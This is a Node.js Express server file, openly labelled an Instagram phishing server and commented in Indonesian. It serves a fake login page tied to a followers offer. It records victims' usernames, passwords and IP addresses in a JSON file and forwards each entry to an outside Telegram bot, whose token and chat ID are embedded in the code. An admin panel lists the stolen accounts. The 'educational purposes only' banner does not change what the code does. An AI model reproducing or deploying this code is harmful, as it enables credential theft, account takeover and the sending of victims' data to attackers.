// ========== INSTAGRAM PHISHING SERVER ==========
// by TEGUH SI PINTER - Jalanin dengan: node server.js
// ===============================================

const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== KONFIGURASI ==========
const BOT_TOKEN = '8571006025:AAHh19imq5oUuOIX33znhfCTXC6xNix9Exo'; // GANTI DENGAN TOKEN BOT ANDA
const CHAT_ID = '6834832649';     // GANTI DENGAN CHAT ID ANDA
const ADMIN_PASSWORD = '083183';

// Data korban disimpan di file JSON
const DATA_FILE = path.join(__dirname, 'victims.json');

// ========== MIDDLEWARE ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ========== FUNGSI BACA & SIMPAN DATA ==========
function loadVictims() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (err) {
        console.log('Error loading data:', err.message);
    }
    return [];
}

function saveVictims(victims) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(victims, null, 2));
        console.log(`✅ Data saved: ${victims.length} victims`);
        return true;
    } catch (err) {
        console.log('Error saving data:', err.message);
        return false;
    }
}

// ========== KIRIM PESAN KE TELEGRAM ==========
async function sendToTelegram(username, password, followers, ip) {
    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.log('⚠️ Telegram bot not configured, skipping...');
        return false;
    }
    
    const message = `
🔥 *INSTAGRAM PHISHING VICTIM* 🔥

👤 *Username:* ${username}
🔑 *Password:* ${password}
📊 *Package:* ${followers} followers
🌐 *IP:* ${ip}
⏰ *Time:* ${new Date().toLocaleString('id-ID')}
    `;
    
    try {
        const https = require('https');
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const postData = JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        
        const req = https.request(url, options);
        req.write(postData);
        req.end();
        
        console.log(`✅ Telegram notification sent for: ${username}`);
        return true;
    } catch (err) {
        console.log('❌ Telegram error:', err.message);
        return false;
    }
}

// ========== ROUTES ==========

// Halaman utama
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Halaman processing
app.get('/processing.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'processing.html'));
});

// Halaman admin
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API: Login (phishing)
app.post('/api/login', async (req, res) => {
    const { username, password, followers } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    
    console.log(`[LOGIN] ${username} | ${password} | ${followers} followers | IP: ${ip}`);
    
    if (!username || !password) {
        return res.status(400).json({ error: 'Missing credentials' });
    }
    
    // Simpan data korban
    const victims = loadVictims();
    victims.unshift({
        id: Date.now(),
        username: username,
        password: password,
        followers: followers || '3000',
        ip: ip,
        timestamp: new Date().toLocaleString('id-ID'),
        rawTime: Date.now()
    });
    saveVictims(victims);
    
    // Kirim ke Telegram
    await sendToTelegram(username, password, followers || '3000', ip);
    
    // Redirect ke halaman processing
    res.redirect('/processing.html');
});

// API: Admin login
app.post('/api/admin', (req, res) => {
    const { password } = req.body;
    
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true, message: 'Login berhasil' });
    } else {
        res.json({ success: false, message: 'Password salah!' });
    }
});

// API: Get data korban
app.get('/api/get-data', (req, res) => {
    const authPass = req.headers['x-admin-pass'];
    
    if (authPass !== ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const victims = loadVictims();
    res.json({ success: true, data: victims, total: victims.length });
});

// API: Clear all data
app.post('/api/clear-data', (req, res) => {
    const { password } = req.body;
    
    if (password !== ADMIN_PASSWORD) {
        return res.json({ success: false, message: 'Password salah!' });
    }
    
    saveVictims([]);
    res.json({ success: true, message: 'Semua data berhasil dihapus!' });
});

// API: Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'ok', 
        message: 'API is working!', 
        time: new Date().toISOString(),
        victimsCount: loadVictims().length
    });
});

// ========== START SERVER ==========
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════╗
║   🔥 INSTAGRAM PHISHING SERVER 🔥      ║
║        by TEGUH SI PINTER              ║
╠════════════════════════════════════════╣
║   📡 Server running on port: ${PORT}     
║   🌐 URL: http://localhost:${PORT}       
║   🔗 Admin Panel: http://localhost:${PORT}/admin
║   🔑 Admin Password: ${ADMIN_PASSWORD}
╠════════════════════════════════════════╣
║   ⚠️  FOR EDUCATIONAL PURPOSES ONLY    ║
╚════════════════════════════════════════╝
    `);
});
